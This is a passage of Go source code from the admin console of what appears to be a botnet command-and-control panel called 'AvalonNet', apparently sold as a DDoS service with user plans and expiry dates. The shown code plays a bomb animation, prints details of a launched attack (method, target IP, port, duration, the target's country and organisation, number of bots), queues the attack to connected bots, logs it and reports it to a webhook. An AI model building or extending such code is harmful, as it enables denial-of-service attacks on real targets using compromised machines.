			this.conn.Write([]byte("\033[37m         | == /        \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  /         \r\n"))
			this.conn.Write([]byte("\033[37m           |/          \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
			this.conn.Write([]byte("\033[37m          | == /       \r\n"))
			this.conn.Write([]byte("\033[37m           |  |        \r\n"))
			this.conn.Write([]byte("\033[37m           |  |        \r\n"))
			this.conn.Write([]byte("\033[37m           |  /        \r\n"))
			this.conn.Write([]byte("\033[37m            |/         \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
			this.conn.Write([]byte("\033[37m          | == /       \r\n"))
			this.conn.Write([]byte("\033[37m           |  |        \r\n"))
			this.conn.Write([]byte("\033[37m           |  |        \r\n"))
			this.conn.Write([]byte("\033[37m           |  /        \r\n"))
			this.conn.Write([]byte("\033[37m            |/         \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m         / **/|        \r\n"))
			this.conn.Write([]byte("\033[37m         | == /        \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  |         \r\n"))
			this.conn.Write([]byte("\033[37m          |  /         \r\n"))
			this.conn.Write([]byte("\033[37m           |/          \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m          / **/|       \r\n"))
			this.conn.Write([]byte("\033[37m          | == /       \r\n"))
			this.conn.Write([]byte("\033[37m           |  |        \r\n"))
			this.conn.Write([]byte("\033[37m           |  |        \r\n"))
			this.conn.Write([]byte("\033[37m           |  /        \r\n"))
			this.conn.Write([]byte("\033[37m            |/         \r\n"))
			time.Sleep(50 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m                       \r\n"))
			this.conn.Write([]byte("\033[37m           |/**/|       \r\n"))
			this.conn.Write([]byte("\033[37m           / == /       \r\n"))
			this.conn.Write([]byte("\033[37m            |  |        \r\n"))
			time.Sleep(400 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m     _.-^^---....,,--             \r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m _--                  --_         \r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m<                        >)        \r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m|                         |        \r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m /._                   _./         \r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m    ```--. . , ; .--'''            \r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m          | |   |                  \r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m       .-=||  | |=-.               \r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m       `-=#$%&%$#=-'               \r\n"))
			this.conn.Write([]byte("\x1b[38;5;125m          | ;  :|    \x1b[38;5;82mBOOMMMM.\x1b[39m\r\n"))
			this.conn.Write([]byte("\x1b[38;5;231m _____.,-#%&$@%#&#~,._____         \r\n"))
			this.conn.Write([]byte("\r\n"))
			time.Sleep(1000 * time.Millisecond)

			this.conn.Write([]byte("\033[2J\033[1H"))

			botsToUse := this.user.maxBots
			if attack.Bots > 0 {
				botsToUse = attack.Bots
			}

			displayBots := botsToUse
			if displayBots == -1 {
				displayBots = clientList.Count()
			} else if displayBots > clientList.Count() {
				displayBots = clientList.Count()
			}

			lines := []string{
				"\r\n",
				"  \x1b[38;5;231m[ \033[38;5;125mAttacks details \x1b[38;5;231m]\r\n",
				"   \033[38;5;125m║\x1b[39m \x1b[38;5;231mStatus \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[38;5;84mSuccessfully \x1b[38;5;231m]\r\n",
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mMethod \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", method),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mTarget \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", targetIPStr),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mPort \x1b[39m\033[38;5;125m······· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%d \x1b[38;5;231m]\r\n", attack.Port),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mTime \x1b[39m\033[38;5;125m······· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%d \x1b[38;5;231m]\r\n", attack.Duration),
				"  \x1b[38;5;231m[ \033[38;5;125mTarget info \x1b[38;5;231m]\r\n",
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mCountry \x1b[39m\033[38;5;125m···· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", ipInfo.Country),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mOrg \x1b[39m\033[38;5;125m········ \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", ipInfo.Org),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mRegion \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", ipInfo.Region),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mDate \x1b[39m\033[38;5;125m······· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", time.Now().Format("2006-01-02 15:04:05")),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mSender \x1b[39m\033[38;5;125m····· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%s \x1b[38;5;231m]\r\n", this.user.username),
				fmt.Sprintf("   \033[38;5;125m║\x1b[39m \x1b[38;5;231mBots \x1b[39m\033[38;5;125m······· \x1b[38;5;231m[ \x1b[39m\033[38;5;125m%d \x1b[38;5;231m]\r\n", displayBots),
				"\r\n",
			}

			for _, line := range lines {
				this.conn.Write([]byte(line))
			}

			clientList.QueueBuf(buf, botsToUse, "")
			database.LogAttack(this.user.IDs, attack.TargetIP, attack.Duration, cmdLine, botsToUse)
			this.UpdateTitle()

			// Webhook report
			go sendAttackWebhook(method, targetIPStr, int(attack.Port), int(attack.Duration), ipInfo, this.user.username, clientList.Count(), false)
			continue
		}

		this.conn.Write([]byte("\033[91mComando desconocido.\r\n"))
	}
}

func (this *Admin) UpdateTitle() error {
	botCount := clientList.Count()
	if this.user.maxBots != -1 && botCount > this.user.maxBots {
		botCount = this.user.maxBots
	}
	running := database.fetchRunningAttacks()
	expiryStr := "Nunca"
	if this.user.expiry > 0 {
		expiryStr = time.Unix(this.user.expiry, 0).Format("02/01/06")
	}
	isRunning := atomic.LoadInt32(&AttacksEnabled) == 1
	var runningStr string
	if isRunning {
		runningStr = fmt.Sprintf("%d/%d", running, MaxGlobalAttacks)
	} else {
		runningStr = "X/X"
	}

	var title string
	if this.user.admin == 1 {
		title = fmt.Sprintf("\033]0;AvalonNet | User: %s | Expire: %s | Bots: %d | Running: %s\007", this.user.username, expiryStr, botCount, runningStr)
	} else {
		title = fmt.Sprintf("\033]0;AvalonNet | User: %s | Plan: %s | Expire: %s | Running: %s\007", this.user.username, this.user.planName, expiryStr, runningStr)
	}
	if _, err := this.conn.Write([]byte(title)); err != nil {
		return err
	}
	return nil
}

func (this *Admin) DrawBanner() {
	this.conn.Write([]byte("\033[2J\033[1;1H"))

	expiryStr := "Nunca"
	if this.user.expiry > 0 {
		expiryStr = time.Unix(this.user.expiry, 0).Format("2006-01-02")
	}
	botCount := clientList.Count()

	this.conn.Write([]byte(fmt.Sprintf("    \x1b[38;5;231mPlan: \x1b[38;5;125m%s \x1b[38;5;231m| expire: \x1b[38;5;125m%s \x1b[38;5;231m| bots: \x1b[38;5;125m%d\r\n", this.user.planName, expiryStr, botCount)))

	this.conn.Write([]byte("\x1b[38;5;125m"))
	this.conn.Write([]byte("                               | \\\r\n"))
	this.conn.Write([]byte("                               | |\r\n"))
	this.conn.Write([]byte("      |\\                       | |\r\n"))
	this.conn.Write([]byte("     /, ~\\                     / /\r\n"))
	this.conn.Write([]byte("    X     --------.....-------./ /\r\n"))
	this.conn.Write([]byte("     ~-. ~  ~              |\r\n"))
	this.conn.Write([]byte("        \\             /    | \x1b[38;5;231mAvalonNet v1.5\x1b[38;5;125m\r\n"))
	this.conn.Write([]byte(fmt.Sprintf("         \\  /_     ___\\   /  \x1b[38;5;231mUser: \x1b[38;5;125m%s\r\n", this.user.username)))
	this.conn.Write([]byte("\x1b[38;5;125m         | /\\ ~~~~~   \\  |\r\n"))
	this.conn.Write([]byte("         | |\\ \\       || )\r\n"))
	this.conn.Write([]byte("        (_/ (_/      ((_/\x1b[39m\r\n"))

	this.conn.Write([]byte("\r\n\x1b[38;5;240mType '?' or 'help' for commands.\x1b[39m\r\n\r\n"))
}

func (this *Admin) ReadLine(masked bool) (string, error) {
	buf := make([]byte, 1024)
	bufPos := 0
	for {
		temp := make([]byte, 1)
		n, err := this.conn.Read(temp)
		if err != nil || n != 1 {
			return "", err
		}

		b := temp[0]

		if b == '\r' || b == '\n' {
			if bufPos == 0 && b == '\n' {
				continue
			}
			this.conn.Write([]byte("\r\n"))
			return string(buf[:bufPos]), nil
		}

		if b == '\x7F' || b == '\x08' {
			if bufPos > 0 {
				this.conn.Write([]byte("\b \b"))
				bufPos--
			}
			continue
		}

		if b < 32 {
			continue
		}

		if bufPos < len(buf) {
			buf[bufPos] = b
			if masked {
				this.conn.Write([]byte("*"))
			} else {
				this.conn.Write([]byte{b})
			}
			bufPos++
		}
	}
}
